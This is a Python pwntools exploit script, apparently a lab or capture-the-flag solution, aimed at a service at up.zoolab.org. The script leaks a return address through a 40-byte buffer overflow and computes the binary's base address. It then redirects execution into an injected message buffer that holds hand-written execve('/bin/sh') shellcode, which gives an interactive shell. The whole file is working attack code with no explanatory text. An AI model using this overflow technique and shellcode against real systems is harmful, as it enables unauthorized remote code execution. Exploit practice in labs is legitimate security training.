#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 10258

# elf = ELF(exe)
# off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


shellcode = asm("""
    xor rax, rax           
    mov rbx, rax          

    push rbx               
    mov rdi, 0x68732f6e69622f 
    push rdi               
    mov rdi, rsp           
    push rbx               
    push rdi              
    mov rsi, rsp          

    push rbx              
    mov rdx, rsp          

    mov al, 59            
    syscall 
""")

payloads = b'A'*40
r.recvuntil(b'name? ')
r.send(payloads)

z = r.recvline()
print(z)
return_address = u64(z.split(b'A'*40)[1][:-1].ljust(8, b'\x00'))

# main() to task() is 160 bytes
main_offset = 0x8a44
task_offset = 0x8ae4
msg_offset = 0xd31e0
offset = task_offset - main_offset

base_addr = return_address - offset - main_offset
msg_addr = base_addr + msg_offset

new_return_address = p64(msg_addr)

payloads = b'A'*40 + new_return_address

r.recvuntil(b'number? ')
r.send(payloads)

r.recvuntil(b'name? ')
r.send(payloads)

r.recvuntil(b'message: ')
r.send(shellcode)

r.interactive()